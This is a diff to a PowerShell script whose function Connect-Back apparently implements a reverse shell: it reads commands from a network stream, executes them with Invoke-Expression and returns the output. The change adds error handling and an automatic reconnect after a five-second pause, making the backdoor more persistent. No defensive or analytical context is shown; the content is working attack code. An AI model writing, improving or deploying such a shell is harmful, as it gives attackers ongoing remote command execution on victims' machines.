@@ -44,19 +44,28 @@ function Connect-Back {
     $writer = New-Object System.IO.StreamWriter($stream)
     $reader = New-Object System.IO.StreamReader($stream)
 
-    while ($true) {
-        $data = $reader.ReadLine()
-        if ($data) {
-            $output = Invoke-Expression $data 2>&1 | Out-String
-            $output = $output.Trim()
-            $writer.WriteLine($output)
-            $writer.Flush()
+    try {
+        while ($true) {
+            $data = $reader.ReadLine()
+            if ($data) {
+                try {
+                    $output = Invoke-Expression $data 2>&1 | Out-String
+                } catch {
+                    $output = $_.Exception.Message
+                }
+                $output = $output.Trim()
+                $writer.WriteLine($output)
+                $writer.Flush()
+            }
         }
+    } catch {
+        Start-Sleep -Seconds 5
+        Connect-Back -ip $ip -port $port
+    } finally {
+        $writer.Close()
+        $reader.Close()
+        $client.Close()
     }
-
-    $writer.Close()
-    $reader.Close()
-    $client.Close()
 }
 
 # Main execution
